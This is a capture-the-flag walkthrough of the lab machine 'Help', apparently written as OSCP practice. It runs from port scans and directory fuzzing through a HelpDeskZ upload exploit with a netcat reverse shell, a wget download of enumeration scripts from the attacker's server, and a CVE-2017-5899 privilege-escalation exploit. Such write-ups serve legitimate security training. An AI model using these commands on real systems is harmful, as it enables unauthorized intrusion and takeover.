---
Category: OSCP - TjNull
LAB:
Difficulty: Easy
Featured:
aliases:
---

---
# Information / Description

![](../../0.%20Assets/Help-1789812382733.webp)

---

# Walkthrough


We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.

First let's find the ports

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable i created to store the IP of the target machine

We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again

![](../../0.%20Assets/Help-1789812474848.webp)

Here you can find the dotfiles for kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

```
nmap -sS -p 22,80,3000  $T -sVC -oN results.txt --min-rate 5000 -vvv -Pn -n
```

And these are the results of the scan

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv+ds8nS7Mva9e9ztlad/fzBlyBpkiYxty+peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8+D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis=
|   256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://help.htb/
|_http-server-header: Apache/2.4.18 (Ubuntu)
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Seems like we have an ssh an http server and what looks like an API
we can also see the name of the machine in the output `help.htb` so let's add that to `/etc/hosts`

So I checked the API and loot at that

![](../../0.%20Assets/Help-1789814111124.webp)

That looks like an invitation and now we have a possible username : `Shiv`

I tried doing some fuzzing  and some endpoints I could come up with like `/credentials` and such but with no luck.

So let's get back to the HTTP server


![](../../0.%20Assets/Help-1789812683038.webp)

and now it resolves properly, let's do some fuzzing and see if we find something

```
gobuster dir -u http://help.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -t 50
```

```
support              (Status: 301) [Size: 306] [--> http://help.htb/support/]
javascript           (Status: 301) [Size: 309] [--> http://help.htb/javascript/]
server-status        (Status: 403) [Size: 296]
```

This is what it found so long, and now it resolves

![](../../0.%20Assets/Help-1789812800453.webp)

we see `helpdeskZ`, let's see if we find any exploits for it

I tried a lot of different exploits until I found this one which gave a little explanation of how to really exploit the service:

![](../../0.%20Assets/Help-1789815988083.webp)

So that is what I did, I first uploaded the file

![](../../0.%20Assets/Help-1789816501028.webp)

started the listener with 

```
nc -nlvp 1234
```

and run the [exploit](https://github.com/trevlee/helpdeskz_exploit/tree/master), which  is a ported version of the original in Python3

```
python3 exploit.py http://help.htb/ filename.php
```

![](../../0.%20Assets/Help-1789816668675.webp)

I have to say It took a couple tries to make it work

And in the home directory

![](../../0.%20Assets/Help-1789816968588.webp)

For `privesc`, I like to `cd` in `/tmp` because we know we have permissions on that folder and on restart all of the files we add/create there will be deleted so it's a 2x1 type of situation.

And with the python server I pulled `linpeas.sh` and `lse.sh` to start the enumeration

```
# HTTP server
python3 -m http.server 80 # I have a zsh alias to `serve`

# Downloading files from terminal
wget http://<yourIP>/<file-to-download>
```


![](../../0.%20Assets/Help-1789817997260.webp)

Then we only need to give them executable permissions with `chmod +x <filename>` and run them

After running `lse.sh` I found a couple interesting things, let's go through them one by one

![](../../0.%20Assets/Help-1789818533430.webp)

This is not really useful, or at least, I haven't found a way to exploit it yet

![](../../0.%20Assets/Help-1789818708261.webp)

Here for example  we se user crontab

![](../../0.%20Assets/Help-1789818762603.webp)

I find hard to believe this is exploitable, because there is an absolute path

I still took a look at the file it was starting and just some javascript (I thought i saw the API endpoints but not really)

![](../../0.%20Assets/Help-1789819154848.webp)

This looks interesting let's do a quick search

![](../../0.%20Assets/Help-1789819177908.webp)

Okay this looks promising, let's try it

I downloaded the exploit from here: [github](https://github.com/bcoles/local-exploits/blob/master/CVE-2017-5899/exploit.sh)

Got it in the victim with the `python http server` and run it:

![](../../0.%20Assets/Help-1789819352916.webp)

And done !

![](../../0.%20Assets/Help-1789819381268.webp)